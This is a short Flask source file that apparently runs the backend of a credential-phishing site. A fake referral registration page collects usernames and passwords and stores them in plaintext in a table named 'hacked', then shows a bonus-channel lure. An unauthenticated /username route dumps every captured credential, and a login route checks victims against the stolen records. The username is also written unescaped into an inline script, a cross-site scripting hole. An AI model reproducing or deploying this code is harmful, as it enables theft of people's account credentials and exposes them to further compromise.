from flask import Flask,render_template,request
import sqlite3
app = Flask(__name__,template_folder='.')
@app.route('/register/referal_id/5623',methods=["POST","GET"])
def register():
    if request.method == "POST":
        username = request.form['username']
        password = request.form["password"]
        print(username,password)
        db = sqlite3.connect("database.db")
        cursor = db.cursor()
        cursor.execute("INSERT INTO hacked (username,password) VALUES (?,?)",(username,password))
        db.commit()
        return f'<script>alert("please user {username} subscribe one of our channel and get your first bonus");window.history.back()</script>'
            
    return render_template("register.html")
@app.route('/username')
def username():
    db = sqlite3.connect("database.db")
    cursor = db.cursor()  
    cursor.execute("SELECT * FROM hacked")
    fetch = cursor.fetchall()
    return fetch
     

@app.route('/login',methods=["POST","GET"])  
def login():
    if request.method == "POST":
            username = request.form['username']
            password = request.form["password"]
            print(username,password)
            db = sqlite3.connect("database.db")
            cursor = db.cursor()
            cursor.execute("SELECT * FROM hacked WHERE username = ? AND password = ?",(username,password))
            fetch = cursor.fetchone()
            if fetch:
                return '<script>alert("please wait a moment");window.history.back()</script>'
            else:
                return '<script>alert("No username found");window.history.back()</script>'
            
    return render_template("login.html")      
            
          

